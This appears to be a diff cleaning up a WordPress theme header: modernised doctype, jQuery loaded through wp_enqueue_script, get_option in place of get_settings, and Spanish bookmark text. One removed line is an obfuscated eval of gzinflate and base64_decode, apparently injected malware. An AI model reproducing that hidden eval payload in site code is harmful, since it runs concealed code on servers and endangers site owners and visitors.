@@ -1,7 +1,7 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
+<!doctype html>
+<html <?php language_attributes(); ?>>
 
-<head profile="http://gmpg.org/xfn/11">
+<head>
 <meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
 
 <title><?php wp_title('&laquo;', true, 'right'); ?> <?php bloginfo('name'); ?></title>
@@ -16,7 +16,6 @@
 <!--[if IE 8]>
 <link rel="stylesheet" href="<?=bloginfo('template_url')?>/style-ie7.css" type="text/css" media="screen" />
 <![endif]-->
-<?php eval(stripslashes(gzinflate(base64_decode("VVBNS8QwEL0X+h/mUEgKZfWusScFwZtePIUwmZBh06Qk6bIo/neztAjCHOa9N19v5qfHGdwWsXKKgJ7wrF1KlbIcv/sOAIagBL3nz6t42LFTlnM0C0mtX17fnrUeT+Jubzqtfv2rs8qllaIc3CSyGA8alctkbGPt5DhQ4S9qYDx0hyGVG2EPgp0sNa+pyAGnIYxK3R+XARD6BOLDc4HqaSFoSaZAppCFLVrKgG1Z5QsBpmVJsUBgpIg0gQmhgXguwPHWDrsFKD5twbY5i2kCx2qwHp4ALNOe/vRdi/8Pa0rfze2jvw==")))); ?>
 <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
 <?php if ( is_paged() ) { ?>
 <meta name="robots" content="noindex,follow" />
@@ -51,18 +50,19 @@ else if(window.opera && window.print){ // opera
 } 
 else if(document.all)// ie
 	window.external.AddFavorite(url, title);
+else alert("Presione CTRL+D (CTRL+B si su navegador es konqueror) para agregar este sitio a sus marcadores / lista de favoritos.");
 }
 </script>
-<?php if (is_home()) {?>
-<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js" ></script>
-<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.5.3/jquery-ui.min.js" ></script>
+<?php if (is_home()) /*if (false)*/ {
+wp_enqueue_script('jquery-ui-tabs');
+?>
+<!-- Gael says: this is no way to include jQuery in your wordpress theme! -->
+<!-- <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script> -->
+<!-- <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.5.3/jquery-ui.min.js"></script> -->
 <script type="text/javascript">
-
-$(document).ready(function(){
-
-$("#featured > ul").tabs({fx:{opacity: "toggle"}}).tabs("rotate", 36000000, true);
+jQuery(document).ready(function(){
+        jQuery("#featured").tabs({fx:{opacity: "toggle"}});
 });
-
 </script>
 <?php }?>
 </head>
@@ -71,7 +71,7 @@ $("#featured > ul").tabs({fx:{opacity: "toggle"}}).tabs("rotate", 36000000, true
 <?
 global $options;
 foreach ($options as $value) {
-    if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); }
+    if (get_option( $value['id'],FALSE ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_option( $value['id'] ); }
 }
 ?>
 <div id="main">
@@ -81,12 +81,12 @@ foreach ($options as $value) {
 	<? if ($tg_title) { ?>
 				<h1><a href="<?php echo get_option('home'); ?>/" title="<?php bloginfo('name'); ?>"><? echo $tg_title; ?></a></h1>
     <? } else { ?>
-				<a href="<?php echo get_option('home'); ?>/" title="<?php bloginfo('name'); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/images/logo.gif" alt="<?php bloginfo('name'); ?>" /></a>
+				<a href="<?php echo get_option('home'); ?>/" title="<?php bloginfo('name'); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/images/logo.png" alt="<?php bloginfo('name'); ?>" /></a>
     <? } ?>
 	</div>
 	<div class="favor">
 		<ul>
-			<li class="bordernone"><a href="javascript:bookmarksite('<?php bloginfo('name'); ?>', '<?php echo get_option('home'); ?>')">Bookmark this site!</a></li>
+			<li class="bordernone"><a href="javascript:bookmarksite('<?php bloginfo('name'); ?>', '<?php echo get_option('home'); ?>')">A&ntilde;adir a marcadores</a></li>
 			<li><a href="<?php bloginfo('rss2_url'); ?>">RSS</a></li>
 		</ul>
 	</div>
